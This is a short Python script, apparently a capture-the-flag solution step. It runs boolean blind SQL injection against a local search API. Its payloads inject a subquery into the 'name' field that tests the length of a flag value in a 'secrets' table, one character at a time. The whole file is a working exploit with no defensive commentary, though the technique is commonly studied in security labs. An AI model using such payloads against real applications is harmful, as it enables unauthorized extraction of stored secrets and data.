import requests
import json

url = "http://localhost:3000/api/search"
length = 0
max_length = 100 # Set an upper limit for flag length
print("Starting flag length discovery...")
while length <= max_length:
    payload = {"name": f"' OR (SELECT 1 FROM secrets WHERE secret_key = 'flag' AND LENGTH(secret_value) > {length}) -- "}
    print(f"Testing length > {length}")
    try:
        response = requests.post(url, json=payload)
        response_data = response.json()
        print(f"Response: {response_data}")
        if response_data.get("found") is True:
            length += 1
        else:
            # The length is not greater than the current 'length', so the actual length is 'length'
            break
    except requests.exceptions.RequestException as e:
        print(f"An error occurred during request: {e}")
        print("Could not determine flag length due to request error.")
        length = -1 # Indicate failure
        break
    except json.JSONDecodeError:
        print("Failed to decode JSON response. Unexpected response format.")
        print("Could not determine flag length due to unexpected response.")
        length = -1 # Indicate failure
        break
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        print("Could not determine flag length due to an unexpected error.")
        length = -1 # Indicate failure
        break

if length > 0 and length <= max_length:
    print(f"Flag length is: {length}")
elif length == 0:
     print("Flag length is 0 or less, which is unexpected.")
else:
    print("Failed to determine flag length within the maximum limit or due to an error.")